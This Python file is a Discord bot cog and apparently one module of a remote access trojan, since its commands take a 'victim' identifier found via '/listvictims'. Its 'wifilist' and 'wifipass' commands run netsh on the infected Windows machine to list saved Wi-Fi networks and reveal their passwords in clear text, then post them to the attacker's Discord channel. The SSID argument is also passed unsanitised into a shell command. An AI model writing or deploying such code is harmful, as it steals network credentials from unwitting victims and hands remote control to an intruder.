import disnake as discord
from disnake.ext import commands
from datetime import datetime

import os, re, requests
nr_working = f"C:\\Users\\{os.getenv('username')}\\.cache"

class Wifi(commands.Cog):
    def __init__(self, bot: commands.Bot):
        self.bot = bot
        self.ip_addr = self.bot.ip_addr
        
    @commands.slash_command( )
    async def wifilist(self, ctx, victim):
        """Lists all wifi networks
    
        Parameters
        ----------
        victim: Identifier of the affected computer (found via /listvictims).
        """
        if str(victim) == str(self.bot.identifier):
            ssids = []
            msg = ""
            
            output = os.popen("netsh wlan show profiles").read()
            profiles = re.findall(r"All User Profile\s(.*)", output)
            for profile in profiles:
                ssid = profile.strip().strip(":").strip()
                ssids.append(ssid)
            
            for i, ssid in zip(range(1, len(ssids)+1), ssids):
                msg += f"{i}) {ssid}\n"
            
            if len(msg) >= 4000:
                return await ctx.response.send_message(
                    "All saved wifi networks:```" + msg + "```"
                )
            
            await ctx.response.send_message(
                embed=self.bot.genEmbed(
                    "All saved wifi networks:", 
                    datetime.now(), msg
                )
            )

    @commands.slash_command( )
    async def wifipass(self, ctx, victim, ssid):
        """Lists specified wifi password
    
        Parameters
        ----------
        victim: Identifier of the affected computer (found via /listvictims).
        ssid: The name of the WIFI
        """
        if str(victim) == str(self.bot.identifier):
            ssid_details = os.popen(f"""netsh wlan show profile "{ssid}" key=clear""").read()
            ciphers = re.findall(r"Cipher\s(.*)", ssid_details)
            ciphers = "/".join([c.strip().strip(":").strip() for c in ciphers])
            key = re.findall(r"Key Content\s(.*)", ssid_details)
            try:
                key = key[0].strip().strip(":").strip()
            except IndexError:
                key = "None"
            
            await ctx.response.send_message(
                embed = self.bot.genEmbed(
                    "Wifi password for " + ssid + ":",
                    datetime.now(), key
                )
            )

def setup(bot: commands.Bot):
    bot.add_cog(Wifi(bot))